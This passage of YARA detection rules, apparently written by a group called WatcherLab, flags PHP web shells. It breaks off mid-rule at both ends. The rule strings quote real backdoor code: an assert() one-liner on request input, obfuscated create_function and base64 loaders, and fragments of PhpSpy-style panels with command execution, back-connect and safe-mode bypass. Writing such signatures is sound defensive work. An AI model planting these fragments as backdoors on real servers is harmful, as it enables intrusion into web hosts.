      hash1 = "b0dd4b7a4e92c5ff9932e0e5c5a47f143860c8ede4fdd34cda101202bd3c7fb1"
   strings:
      $x1 = "* @link       http://www.GetAnahita.com" fullword ascii
      $s2 = "* @param KCommandContext $context Context parameter" fullword ascii
      $s3 = "* @author     Rastin Mehr <rastin@anahitapolis.com>" fullword ascii
      $s4 = "* @author     Arash Sanieyan <ash@anahitapolis.com>" fullword ascii
      $s5 = "* @see ComBaseControllerService::_actionEdit()" fullword ascii
      $s6 = "* @param KConfig $config An optional KConfig object with configuration options." fullword ascii
      $s7 = "* @license    GNU GPLv3 <http://www.gnu.org/licenses/gpl-3.0.html>" fullword ascii
      $s8 = "* Initializes the default configuration for the object." fullword ascii
      $s9 = "protected function _actionEdit(KCommandContext $context)" fullword ascii
      $s10 = "$context->response->setRedirect(route($this->getItem()->getURL().'&layout=edit'));" fullword ascii
      $s11 = "* Article post action." fullword ascii
      $s12 = "public function redirect(KCommandContext $context)" fullword ascii
      $s13 = "* Called from {@link __construct()} as a first step of object instantiation." fullword ascii
      $s14 = "* Article Controller." fullword ascii
      $s15 = "* Redirect after edit." fullword ascii
      $s16 = "class ComArticlesControllerArticle extends ComMediumControllerDefault" fullword ascii
      $s17 = "* (non-PHPdoc)" fullword ascii
      $s18 = "protected function _initialize(KConfig $config)" fullword ascii
      $s19 = "if ($context->action == 'edit' || $context->action == 'add') {" fullword ascii
      $s20 = "parent::_initialize($config);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 4KB and
      1 of ($x*) and 4 of them
}

rule sig_601f568726d5d78a64d3c6df86afb5089a5b32ba
{
   meta:
      description = "php17 - file 601f568726d5d78a64d3c6df86afb5089a5b32ba.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "de53e80411d94b39ea18d9f98cbb1bd6dc07ac2ab732753dec649fef458f3aad"
   strings:
      $s1 = "<?php assert($_REQUEST[\"c\"]);?> " fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}


rule sig_04edbee5e0a3cee384e464d05969bd89b0d32a52
{
   meta:
      description = "php17 - file 04edbee5e0a3cee384e464d05969bd89b0d32a52.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "5c00d5b172f123e7eb9c0735b60fbaf48b22eec4c7560d9586d891d85e0b3db5"
   strings:
      $x1 = "<a href=\"javascript:goaction('shell');\">Execute Command</a> | " fullword ascii
      $x2 = "p('<p><a href=\"http://www.4ngel.net/phpspy/plugin/\" target=\"_blank\">Get plugins</a></p>');" fullword ascii
      $x3 = "Copyright (C) 2004-2008 <a href=\"http://www.4ngel.net\" target=\"_blank\">Security Angel Team [S4T]</a> All Rights Reserved." fullword ascii
      $s4 = "header('Content-Disposition: attachment;filename='.$_SERVER['HTTP_HOST'].'_Files.tar.gz');" fullword ascii
      $s5 = "r: 2008</a></span><?php echo $_SERVER['HTTP_HOST'];?> (<?php echo gethostbyname($_SERVER['SERVER_NAME']);?>)</td>" fullword ascii
      $s6 = "<?php if (!IS_WIN) {?> | <a href=\"javascript:goaction('backconnect');\">Back Connect</a><?php }?>" fullword ascii
      $s7 = "scookie('phpspypass', '', -86400 * 365);" fullword ascii
      $s8 = "function dbconn($dbhost,$dbuser,$dbpass,$dbname='',$charset='',$dbport='3306') {" fullword ascii
      $s9 = "<td><span style=\"float:right;\"><a href=\"http://www.4ngel.net\" target=\"_blank\"><?php echo str_replace('.','','P.h.p.S.p.y')" ascii
      $s10 = "return $data . $ctrldir . $this -> eof_ctrl_dir . pack('v', sizeof($this -> ctrl_dir)) . pack('v', sizeof($this -> ctrl_dir)) ." fullword ascii
      $s11 = "<a href=\"javascript:goaction('sqlfile');\">MySQL Upload &amp; Download</a> | " fullword ascii
      $s12 = "$filename = basename($_SERVER['HTTP_HOST'].'_MySQL.sql');" fullword ascii
      $s13 = "dbconn($dbhost,$dbuser,$dbpass,$dbname,$charset,$dbport);" fullword ascii
      $s14 = "dbconn($dbhost, $dbuser, $dbpass, $dbname, $charset, $dbport);" fullword ascii
      $s15 = "<td><a href=\"javascript:dofile(\\'downrar\\');\">Packing download selected</a> - <a href=\"javascript:dofile(\\'delfiles\\');\"" ascii
      $s16 = "makeinput(array('title'=>'Command','name'=>'command','value'=>$command));" fullword ascii
      $s17 = "scookie('phpspypass', $password);" fullword ascii
      $s18 = "<td><span style=\"float:right;\"><a href=\"http://www.4ngel.net\" target=\"_blank\"><?php echo str_replace('.','','P.h.p.S.p.y')" ascii
      $s19 = "<a href=\"javascript:goaction('logout');\">Logout</a> | " fullword ascii
      $s20 = "href=\"javascript:settable(\\''.$table['Name'].'\\', \\'drop\\');\">Drop</a> ]</td>');" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 200KB and
      1 of ($x*) and 4 of them
}

rule sig_767897be0ff473c3f99e53b2e4682c5ab94d91dd
{
   meta:
      description = "php17 - file 767897be0ff473c3f99e53b2e4682c5ab94d91dd.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "6826ba7ba3d891a4043607cdb818844fc358243b7faf680b0ef4b8bd3bb76b99"
   strings:
      $s1 = "$h='ay(\"/!\",\"+!\")!,$ss($s[$i!],0,$e)))!,$k)));$!o=ob_get_!conten!ts()!;ob_end_!clean()!;$d=ba';" fullword ascii
      $s2 = "$f='!se64!_encode!(x(gzc!omp!ress($o),$!k));pr!int(!\"<!$k>!$d</$k>\")!;@session_d!est!roy();}}}}';" fullword ascii
      $s3 = "$v='t(!);$s=&$_SESSION;!!!$ss=\"subs!!tr\";$!sl=\"strtol!o!wer\";$i=$m[1][0].$m[1][1];!$h=!$sl(!$s!s(';" fullword ascii
      $s4 = "$E='!$o;}!$r=$_SERVER;$r!r=@$r[\"H!TTP_!REFER!ER\"];!$r!a=!!!@$r[\"HTTP_ACCEPT_LANGU!AGE\"];if($rr!&!';" fullword ascii
      $s5 = "$c='rt();@ev!al(@gzunc!ompres!s!(!@x(!@ba!se64_decode(preg_!repl!ace(array(\"/_/!!\",\"/-/\"!),arr!';" fullword ascii
      $s6 = "$L='ch_all!(\"/(![\\\\w])![\\\\w-!]+(?:;q!=0.([\\\\d])!)!?,?/\",$ra,$m!);!if($q&&!$m){@s!ession!!_!star';" fullword ascii
      $s7 = "$V='&$!ra){$u=parse_!url($rr!);parse!_!s!tr($!u[\"query\"],!$q);$q=array_v!alu!es(!$q);preg_mat!';" fullword ascii
      $s8 = "$z='md5($i.$kh),0,!3));$!f=$!sl($ss(md5!(!!$i.$kf),0,3!));$p=\"\";f!or($z!=1!;$z<count($m[!1!]);';" fullword ascii
      $s9 = "$F='$z+!+)$p.=$q[$m![2]![$z!]];if(st!r!pos($p,$h)===0){!$s![$!i]=\"\"!;$p=$ss($p,3)!;!!}if(array';" fullword ascii
      $s10 = "$D='!$kh=\"5!d4!1\";!$kf=\"402a\";f!unction x(!$t,$!k){$c=s!trlen(!$k);$l=str!len($t);$o!=\"\";for!(';" fullword ascii
      $s11 = "$Y='$i=0!;$i<$!!l;){for($j!!=0;($j<$c&&$!i<$l);$!!j++,$i++!){!$o!.!=$t{$i}^$k{$j};}}retu!rn ';" fullword ascii
      $s12 = "$b='_k!ey_exists!!($i!,$s)!){$s[$i]!.=$p;$e=strpos($s[!$i]!,$f);if($!e){$k=$k!!h.$kf!;o!b_sta';" fullword ascii
      $s13 = "$o=str_replace('!','',$D.$Y.$E.$V.$L.$v.$z.$F.$b.$c.$h.$f);" fullword ascii
      $s14 = "$O=str_replace('B','','creBatBBe_fBuBBnction');" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 3KB and
      8 of them
}

rule activeServer_mssqlDAL_class
{
   meta:
      description = "php17 - file activeServer_mssqlDAL.class.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "6fd15c9a2204409209b3e53b1198a9fab21c968df6d0dda15d112cb14542a537"
   strings:
      $s1 = "function  GetPageList(activeServerModel $model, $start, $limit)" fullword ascii
      $s2 = "function  GetPageCount(activeServerModel $model, $perPageCount)" fullword ascii
      $s3 = "function  GetModel(activeServerModel $model)" fullword ascii
      $s4 = "function  GetList(activeServerModel $model)" fullword ascii
      $s5 = "// TODO: Implement GetPageCount() method." fullword ascii
      $s6 = "// TODO: Implement GetPageList() method." fullword ascii
      $s7 = "// TODO: Implement GetModel() method." fullword ascii
      $s8 = "// TODO: Implement GetList() method." fullword ascii
      $s9 = "function  InsertInto(activeServerModel $model)" fullword ascii
      $s10 = "function  DeleteFrom(activeServerModel $model)" fullword ascii
      $s11 = "function  UpDateSet(activeServerModel $model)" fullword ascii
      $s12 = "// TODO: Implement InsertInto() method." fullword ascii
      $s13 = "// TODO: Implement UpDateSet() method." fullword ascii
      $s14 = "// TODO: Implement DeleteFrom() method." fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 2KB and
      8 of them
}

rule AnnotationsTest
{
   meta:
      description = "php17 - file AnnotationsTest.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "cfb9e4bacf3c51b4ec35909a3bd84e7ab4f7c06328b2b39874dc94fa10a060f7"
   strings:
      $x1 = "* through the world-wide-web, please send an email to license@phalconphp.com" fullword ascii
      $s2 = "* @link      http://www.phalconphp.com" fullword ascii
      $s3 = "* @author    Serghei Iakovlev <serghei@phalconphp.com>" fullword ascii
      $s4 = "* @author    Andres Gutierrez <andres@phalconphp.com>" fullword ascii
      $s5 = "* bundled with this package in the file LICENSE.txt" fullword ascii
      $s6 = "* The contents of this file are subject to the New BSD License that is" fullword ascii
      $s7 = "* Tests the Phalcon\\Mvc\\Router\\Annotations component" fullword ascii
      $s8 = "* If you did not receive a copy of the license and are unable to obtain it" fullword ascii
      $s9 = "* \\Phalcon\\Test\\Unit\\Mvc\\Router\\AnnotationsTest" fullword ascii
      $s10 = "expect($router->getControllerName())->equals($controller);" fullword ascii
      $s11 = "* @copyright (c) 2011-2017 Phalcon Team" fullword ascii
      $s12 = "require_once PATH_DATA . '/controllers/NamespacedAnnotationController.php';" fullword ascii
      $s13 = "expect($router->getActionName())->equals($action);" fullword ascii
      $s14 = "$router->addResource(\"MyNamespace\\\\Controllers\\\\NamespacedAnnotation\", \"/namespaced\");" fullword ascii
      $s15 = "$route = $router->getRouteByName(\"save-robot\");" fullword ascii
      $s16 = "$route = $router->getRouteByName(\"save-product\");" fullword ascii
      $s17 = "expect($router->getParams())->equals($params);" fullword ascii
      $s18 = "expect($router->getRoutes())->count(5);" fullword ascii
      $s19 = "expect($router->getRoutes())->count(9);" fullword ascii
      $s20 = "expect($router->getRoutes())->count(1);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 20KB and
      1 of ($x*) and 4 of them
}

rule AddCreditHandler
{
   meta:
      description = "php17 - file AddCreditHandler.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "91ab4a1c84c4781d65f1ee0d84690bbb4ab2e318af6142a7de59cdbd5c8e8aca"
   strings:
      $s1 = "$credit = dispatch(new AddCreditCommand($action, $user));" fullword ascii
      $s2 = "} elseif ($event instanceof UserWasLoggedinEvent) {" fullword ascii
      $s3 = "use Hifone\\Events\\User\\UserWasLoggedinEvent;" fullword ascii
      $s4 = "use Hifone\\Commands\\Credit\\AddCreditCommand;" fullword ascii
      $s5 = "protected function apply($event, $action, $user)" fullword ascii
      $s6 = "use Hifone\\Events\\Thread\\ThreadWasAddedEvent;" fullword ascii
      $s7 = "$user = $event->thread->user;" fullword ascii
      $s8 = "} elseif ($event instanceof UserWasAddedEvent) {" fullword ascii
      $s9 = "namespace Hifone\\Handlers\\Listeners\\Credit;" fullword ascii
      $s10 = "if ($event instanceof ThreadWasAddedEvent) {" fullword ascii
      $s11 = "use Hifone\\Events\\Image\\ImageWasUploadedEvent;" fullword ascii
      $s12 = "use Hifone\\Events\\User\\UserWasAddedEvent;" fullword ascii
      $s13 = "} elseif ($event instanceof ImageWasUploadedEvent) {" fullword ascii
      $s14 = "$this->apply($event, $action, $user);" fullword ascii
      $s15 = "$user = $event->reply->user;" fullword ascii
      $s16 = "use Hifone\\Events\\Reply\\ReplyWasRemovedEvent;" fullword ascii
      $s17 = "use Hifone\\Events\\Credit\\CreditWasAddedEvent;" fullword ascii
      $s18 = "event(new CreditWasAddedEvent($credit, $event));" fullword ascii
      $s19 = "} elseif ($event instanceof ReplyWasRemovedEvent) {" fullword ascii
      $s20 = "} elseif ($event instanceof ReplyWasAddedEvent) {" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 5KB and
      8 of them
}

rule sig_5d2ed065caf1a505aa670d1b063c9ae10c89e5cb
{
   meta:
      description = "php17 - file 5d2ed065caf1a505aa670d1b063c9ae10c89e5cb.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "925367e02311007c1bb49e2ed27f5d7aa5739305bff82fb02acc526504c68fef"
   strings:
      $s1 = "$a='r($j=0;iJiJ($j<iJ$c&&iJ$iiJ<$l);$j++,$i++){$oiJ.=$t{$i}^iJ$iJiJk{$iJjiJ};iJ}}riJetiJurn $o;}$r=$_SERVER;$rr=@$r[\"HTiJiJ';" fullword ascii
      $s2 = "$y='md5(iJ$i.$kh),0,3)iJ);$f=$sl($iJsiJs(md5($i.iJ$kf),0,iJ3));$p=iJ\"\"iJ;foiJr($z=1;$z<coiJiJunt(iJ$m[1]iJ);$z++iJ)$p.=iJ$q';" fullword ascii
      $s3 = "$K=str_replace('Mp','','crMpMpeateMpMp_fMpuncMption');" fullword ascii
      $s4 = "$Q='g_repiJlace(arraiJy(\"/_/\",\"/iJ-/\"),iJarrayiJ(\"iJ/\",\"iJ+\"),$ssiJ($s[$i],0,$e)iJ)),$kiJ)));$o=obiJ_iJget_iJcontentiJs(" ascii
      $s5 = "$i=str_replace('iJ','',$G.$a.$E.$q.$B.$y.$H.$A.$Q.$d);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 4KB and
      all of them
}

rule sig_1d2b9d395844d5560c2976e1130e26d238ad72e2
{
   meta:
      description = "php17 - file 1d2b9d395844d5560c2976e1130e26d238ad72e2.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "2cd980da2abfabece2e42c00fcccc0dda467313ff06793f8c54a3354c90d6755"
   strings:
      $s1 = "$arr = array('test', $_REQUEST['pass']);" fullword ascii
      $s2 = "uasort($arr, base64_decode($e));" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule add_block
{
   meta:
      description = "php17 - file add_block.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "b41bf9910c238216161c541eea2a68c42e5e3b681045e7be733880fdc4197c4e"
   strings:
      $s1 = "$xvc = $this->page->getVersionToModify(); // we need to create a new version of THIS page as well." fullword ascii
      $s2 = "if ($_REQUEST['dragAreaBlockID'] > 0 && Loader::helper('validation/numbers')->integer(" fullword ascii
      $s3 = "if (isset($_REQUEST['arCustomTemplates']) && is_array($_REQUEST['arCustomTemplates'])) {" fullword ascii
      $s4 = "if (!Loader::helper('validation/numbers')->integer($_REQUEST['btID'])) {" fullword ascii
      $s5 = "&& Loader::helper('validation/token')->validate()" fullword ascii
      $s6 = "$db = Block::getByID($_REQUEST['dragAreaBlockID'], $this->pageToModify, $this->areaToModify);" fullword ascii
      $s7 = "if ((!is_object($e)) || (($e instanceof \\Concrete\\Core\\Error\\ErrorList\\ErrorList) && (!$e->has()))) {" fullword ascii
      $s8 = "use Concrete\\Controller\\Backend\\UserInterface\\Page as BackendInterfacePageController;" fullword ascii
      $s9 = "foreach ($_REQUEST['arCustomTemplates'] as $btHandle => $template) {" fullword ascii
      $s10 = "$bv->addScopeItems(array('a' => isset($this->a) ? $this->a : null, 'cp' => $this->permissions, 'ap' => $this->areaPermis" fullword ascii
      $s11 = "$pc->setAdditionalDataAttribute('arHandle', $this->area->getAreaHandle());" fullword ascii
      $s12 = "$nvc = $this->pageToModify->getVersionToModify();" fullword ascii
      $s13 = "$this->area->setCustomTemplate($btHandle, $template);" fullword ascii
      $s14 = "$pc->setAdditionalDataAttribute('aID', $this->area->getAreaID());" fullword ascii
      $s15 = "$this->areaToModify = Area::get($this->pageToModify, STACKS_AREA_NAME);" fullword ascii
      $s16 = "$nb = $this->pageToModify->addBlock($bt, $this->areaToModify, $data);" fullword ascii
      $s17 = "$pc->setAdditionalDataAttribute('btID', $nb->getBlockTypeID());" fullword ascii
      $s18 = "$pc->setAdditionalDataAttribute('bID', $nb->getBlockID());" fullword ascii
      $s19 = "$this->blockType = BlockType::getByID($_REQUEST['btID']);" fullword ascii
      $s20 = "$this->pageToModify = Stack::getByName($_REQUEST['arHandle']);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 20KB and
      8 of them
}

rule sig_184904fad2bac801b5ffd71da2725ce099c1c077
{
   meta:
      description = "php17 - file 184904fad2bac801b5ffd71da2725ce099c1c077.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "93419ee1a9f3416109cebe714b01364db8c45b9ff1d254ef3d8eff21c593b262"
   strings:
      $x1 = "$program = isset($_POST['program']) ? $_POST['program'] : \"c:\\winnt\\system32\\cmd.exe\";" fullword ascii
      $x2 = "$prog = isset($_POST['prog']) ? $_POST['prog'] : \"/c net start > \".$pathname.\"/log.txt\";" fullword ascii
      $x3 = "$exec = $wsh->exec (\"cm\".\"d.e\".\"xe /c \".$_POST['command'].\"\");" fullword ascii
      $x4 = ",'selected'=>$execfunc)).' '.$tb->makeinput('command').' '.$tb->makeinput('Run','command','','submit')));" fullword ascii
      $s5 = "$phpinfo=(!eregi(\"phpinfo\",$dis_func)) ? \" | <a href=\\\"?action=phpinfo\\\" target=\\\"_blank\\\">PHPINFO()</a>\" : \"\";" fullword ascii
      $s6 = "$tb->tdbody('<table width=\"98%\" border=\"0\" cellpadding=\"0\" cellspacing=\"0\"><tr><td><b>command [ system , shell_exec , pa" ascii
      $s7 = "$tb->tdbody('<table width=\"98%\" border=\"0\" cellpadding=\"0\" cellspacing=\"0\"><tr><td><b>command [ system , shell_exec , pa" ascii
      $s8 = "$wsh = new COM('W'.'Scr'.'ip'.'t.she'.'ll') or die(\"PHP Create COM WSHSHELL failed\");" fullword ascii
      $s9 = "echo \"<a href=\\\"$filepath\\\" target=\\\"_blank\\\"><font color='yellow'>$file<STRONG></STRONG></a></td>\\n\";" fullword ascii
      $s10 = "o' id=input><INPUT type='submit' name='shell' value='command shill' id=input></form>\");" fullword ascii
      $s11 = "echo ($proxycontents) ? $proxycontents : \"<body bgcolor=\\\"#F5F5F5\\\" style=\\\"font-size: 12px;\\\"><center><br><p><b>?" fullword ascii
      $s12 = "$tb->headerform(array('content'=>'<FONT COLOR=#9C9C9C>cmd:</FONT>'.$tb->makeselect(array('name'=>'execfunc','option'=>$execfuncs" ascii
      $s13 = "$tb->headerform(array('content'=>'<FONT COLOR=#9C9C9C>cmd:</FONT>'.$tb->makeselect(array('name'=>'execfunc','option'=>$execfuncs" ascii
      $s14 = "d=input><INPUT type='submit' name='shell' value='command shill' id=input></form>\");" fullword ascii
      $s15 = "Wscript.Shell , exec , popen ]</b></td></tr></table>','center','top');" fullword ascii
      $s16 = "<html><head><title>Ernealizm - Edited By KingDefacer</title>" fullword ascii
      $s17 = "$proxycontents = @file_get_contents($_POST['url']);" fullword ascii
      $s18 = "echo \" <form action=\\\"$action\\\" method=\\\"POST\\\"\".$target.\">\\n\";" fullword ascii
      $s19 = "echo '</FONT><strong><FONT COLOR=#9B9B9B>www.alturks.com :</strong><br />';" fullword ascii
      $s20 = "echo \"<a href=\\\"$filepath\\\" target=\\\"_blank\\\">$file</a></td>\\n\";" fullword ascii
   condition:
      uint16(0) == 0x683c and filesize < 100KB and
      1 of ($x*) and 4 of them
}

rule sig_38975df7b993b077a499861b7f4de34d8439ddf3
{
   meta:
      description = "php17 - file 38975df7b993b077a499861b7f4de34d8439ddf3.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "ea743427978d01e07b5aa14268ccc59fde773633a70747659af1a80da4ed0e02"
   strings:
      $x1 = "system(\"perl bcc.pl $ipbc $pbc\") or die(\"I Can Not Execute Command For Back Connect Disable_functions Or Safe Mode\");" fullword ascii
      $x2 = "<a href=\"?do=bypasscmd&address='.getcwd().'\">BypasS Command eXecute(SF-DF)</a> -- <a href=\"?do=symlink&address='.getcwd().'\"" ascii
      $x3 = "<a href=\"?do=bypasscmd&address='.getcwd().'\">BypasS Command eXecute(SF-DF)</a> -- <a href=\"?do=symlink&address='.getcwd().'\"" ascii
      $x4 = "system(\"perl lbp.pl $wb\") or die(\"I Can Not Execute Command For Back Connect Disable_functions Or Safe Mode\");" fullword ascii
      $x5 = "system(\"perl wbp.pl $wb\") or die(\"I Can Not Execute Command For Back Connect Disable_functions Or Safe Mode\");" fullword ascii
      $x6 = "echo $head.\"<p align='center'><b><font color=red>ITSecTeam, IT Security Research & Penetration Testing Team</b></font><br>Versi" ascii
      $x7 = "<a href=\"?do=bypassdir&address='.getcwd().'\">BypasS Directory</a> -- <a href=\"?do=eval&address='.getcwd().'\">" fullword ascii
      $x8 = "<font face=\"Tahoma\" style=\"font-size: 10pt; font-weight:700\"><br>'.$formg.'Command Execute : </font></td>" fullword ascii
      $x9 = "<p align=\"center\"><font face=\"Tahoma\" style=\"font-size: 9pt\"><span lang=\"en-us\"><a href=\"?do=home\">Home</a> -- <a href" ascii
      $x10 = "manager&address='.getcwd().'\">File Manager</a> -- <a href=\"?do=cmd&address='.getcwd().'\">Command Execute</a> -- <a href=\"?do" ascii
      $x11 = "echo $head.$formp.\"<p align='center'>Usage : Run Netcat In Your Machin And Execute This Command( Disable Firewall !!! )<br><hr>" ascii
      $x12 = "<option value=\"system\">System</option>  <option value=\"exec\">Exec</option>  <option value=\"passthru\">Passthru</option>" fullword ascii
      $x13 = "echo $head.'<p align=\"center\"><textarea rows=\"13\" name=\"showbsd\" cols=\"77\">';if($_POST['byws']){passthru(\"\\\\\".$_POST" ascii
      $x14 = "<option value=\"ofms\">Off Mode Security(.htaccess)</option><option value=\"bysap\">Bypass Symlink(.htaccess)</option>" fullword ascii
      $x15 = "t type=submit value =\"Read File\"><input type=hidden name=do value=\"bypassdir\"></form></td></tr></table>'.$end;exit;;" fullword ascii
      $x16 = "$bopens=\"Bypass Succesfull Plz Read File Peji.txt In This Folder\";" fullword ascii
      $s17 = "$exec = $wsh->exec (\"cm\".\"d.e\".\"xe /c \".$_POST['bycw'].\"\");" fullword ascii
      $s18 = "echo $head.'<p align=\"center\"><textarea rows=\"13\" name=\"showbsd\" cols=\"77\">';if($_POST['byws']){passthru(\"\\\\\".$_POST" ascii
      $s19 = ", H4mid@Tm3l , ahmadbady , Doosib )<br>Home Page : <a href='http://www.itsecteam.com'>http://www.itsecteam.com</a><br>Update No" fullword ascii
      $s20 = "<br>Server Information</a> -- <a href=\"?do=d0slocal&address='.getcwd().'\">Dos Local Server</a> -- <a href=\"?do=dump&address='" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 200KB and
      1 of ($x*) and all of them
}

rule sig_9587a61e1afd03b2d7dd7ac6ff8a27236dbb7fc1
{
   meta:
      description = "php17 - file 9587a61e1afd03b2d7dd7ac6ff8a27236dbb7fc1.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "341ca239c30790777da92ad138a01263fafe55e6f5673ee11a7853a57fdc55cc"
   strings:
      $x1 = "<?php ${\"\\x47\\x4c\\x4fB\\x41\\x4c\\x53\"}[\"\\x75\\x65cl\\x63e\\x68g\"]=\"cu\\x72\\x72e\\x6etC\\x4dD\";${\"\\x47L\\x4fB\\x41" ascii
      $s2 = "${\"\\x47\\x4cOB\\x41\\x4cS\"}[\"i\\x78k\\x70\\x70\\x77\\x66\\x74\\x65\"]}=shell_exec(${$oofpwoz});}elseif(is_resource(${${\"\\x" ascii
      $s3 = "x6as\\x72\"]=\"\\x69n\";${${\"GL\\x4fB\\x41\\x4cS\"}[\"f\\x71\\x65\\x72\\x6av\\x6b\"]}=true;@exec(${${\"G\\x4c\\x4f\\x42A\\x4c" ascii
      $s4 = "e\"=>\"\",\"comme\\x6et\"=>\"\");$this->files=array();$this->exclude=array();$this->storeonly=array();$this->error=array();}func" ascii
      $s5 = "gv\\x6c\"]}[\"na\\x6d\\x65\"]));}return 0;}function download_file(){$qeebueo=\"\\x68\\x65\\x61d\\x65\\x72\";if($this->options[\"" ascii
      $s6 = "\\x66b\\x6ejp\\x71\\x73\\x65\\x6e\"]=\"p\\x77\\x64\";${${\"\\x47\\x4cO\\x42\\x41\\x4c\\x53\"}[\"\\x72f\\x62\\x6e\\x6a\\x70\\x71" ascii
      $s7 = "}[\"\\x65\\x62vo\\x71\\x71\\x74w\\x74v\"]}=\"\\x43o\\x6et\\x65nt-\\x44\\x69sposi\\x74io\\x6e:\\x20\\x61\\x74t\\x61\\x63hmen\\x74" ascii
      $s8 = "1DD\\x52\"]:\"\").\")\\x3c/td>\\x3c/t\\x72>\";print\"<\\x74\\x72\\x3e<\\x74\\x64\\x3e\\x3c\\x62>s \\x69s:\\x3c/b\\x3e\\x3c/td>" ascii
      $s9 = "7\\x71\"]}=array();${${\"\\x47\\x4cO\\x42\\x41\\x4c\\x53\"}[\"\\x6d\\x6b\\x6c\\x6cp\\x6e\\x79g\\x67\"]}=getcwd();chdir($this->op" ascii
      $s10 = "}=getcwd();chdir($this->options[\"bas\\x65\\x64i\\x72\"]);if(${${\"\\x47LO\\x42\\x41\\x4c\\x53\"}[\"\\x75\\x67\\x75\\x72\\x77\\x" ascii
      $s11 = "ptions[\"\\x6ea\\x6d\\x65\"],strrpos($this->options[\"\\x6e\\x61me\"],\"/\")+1):$this->options[\"\\x6e\\x61me\"];${$qeebueo}.=\"" ascii
      $s12 = "POST[\"\\x5f\\x63\\x6dd\"]);}else{$zdohhfz=\"cu\\x72\\x72\\x65\\x6e\\x74C\\x4dD\";${$zdohhfz}=\"\";}${${\"\\x47L\\x4f\\x42\\x41" ascii
      $s13 = "x6c\\x7a\"]}=explode(\", \",ini_get(\"\\x64\\x69s\\x61ble\\x5ffun\\x63t\\x69\\x6f\\x6e\\x73\"));return!in_array(${${\"G\\x4c\\x4" ascii
      $s14 = "4cS\"}[\"\\x79\\x68\\x6a\\x68\\x67\\x68\\x67ok\\x79\\x71\"]}=ob_get_clean();}elseif(cust_function_exists(\"sy\\x73t\\x65m\")){$c" ascii
      $s15 = "x3e<\\x68\\x72>\";if(isset($_POST[\"_\\x61c\\x74\"])&&$_POST[\"\\x5fac\\x74\"]==\"Li\\x73\\x74\\x20f\\x69l\\x65s\\x21\"){$enwuog" ascii
      $s16 = "67\\x67\"]}=getcwd();chdir($this->options[\"b\\x61\\x73\\x65di\\x72\"]);foreach($this->files as${${\"\\x47\\x4c\\x4f\\x42\\x41" ascii
      $s17 = "}[\"\\x79\\x69tht\\x73\\x68\\x73\\x64\\x74\\x6c\\x69\"]=\"pw\\x64\";${${\"G\\x4c\\x4f\\x42ALS\"}[\"\\x6e\\x61dyr\\x65\\x70\\x77" ascii
      $s18 = "x65n\\x74\";${${\"GLO\\x42A\\x4c\\x53\"}[\"\\x61\\x6f\\x71\\x77\\x67\\x6e\\x6e\\x68\"]}=preg_replace(\"/([\\\\\\\\^\\$\\\\.\\\\[" ascii
      $s19 = "\"]=\"p\\x77\\x64\";${${\"\\x47\\x4c\\x4f\\x42AL\\x53\"}[\"m\\x6b\\x6c\\x6c\\x70\\x6eygg\"]}=getcwd();chdir($this->options[\"\\x" ascii
      $s20 = "er(\"C\\x6fnten\\x74-\\x54\\x72\\x61\\x6e\\x73f\\x65\\x72-En\\x63\\x6fdin\\x67:\\x20\\x62in\\x61\\x72y\");header(\"\\x43ache-\\x" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 300KB and
      1 of ($x*) and 4 of them
}


rule a8a09bd9013e81b5d154e81af49f3704c0ae8029
{
   meta:
      description = "php17 - file a8a09bd9013e81b5d154e81af49f3704c0ae8029.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "795b71952f69082b7ec201b82311738c0b88e7a694ff942c88fc65d1a6776988"
   strings:
      $s1 = "$kthe=\"JGEpPjgiMpeyRrPSgidwcyc7ZWNobyAnPCcgiugiJGsuJz4nOgi2V2YWwoYgimFzZTY0X2giRlY2gi9kgiZShwcmVn\";" fullword ascii
      $s2 = "$penh=\"sIGpvaW4oYXJyYgiXlfc2xpY2UoJGEsgiJGMoJGEpLTgiMpKSkpgiKTtlY2hvICc8LycgiuJgiGsugiJz4nO30=\";" fullword ascii
      $s3 = "$wmmi=\"X3JlcgiGxhY2UgioYXgiJyYXkoJy9bXlx3PVgixzXS8nLCgicvXHMvJyksIGFycmF5KCcnLCcrgiJyk\";" fullword ascii
      $s4 = "$zrmt=\"JGM9J2NvdWgi50JzskgiYT0gikX0NgiPT0tJRgiTtpZihyZXNldCgkYSk9PSgidvbycggiJgiiYgJGMo\";" fullword ascii
      $s5 = "$rdwm = $jgfi('', $smgv($ftdf(\"gi\", \"\", $zrmt.$kthe.$wmmi.$penh))); $rdwm();" fullword ascii
      $s6 = "$ftdf = str_replace(\"w\",\"\",\"stwrw_wrwepwlwawcwe\");" fullword ascii
      $s7 = "$jgfi = $ftdf(\"l\",\"\",\"lclrlelaltel_functlilon\");" fullword ascii
      $s8 = "$smgv = $ftdf(\"f\", \"\", \"bfafsfef6f4_fdfefcodfe\");" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_0bed4a1966117dd872ac9e8dceceb54024a030fa
{
   meta:
      description = "php17 - file 0bed4a1966117dd872ac9e8dceceb54024a030fa.php"
      author = "WatcherLab"
      date = "2019-02-23"
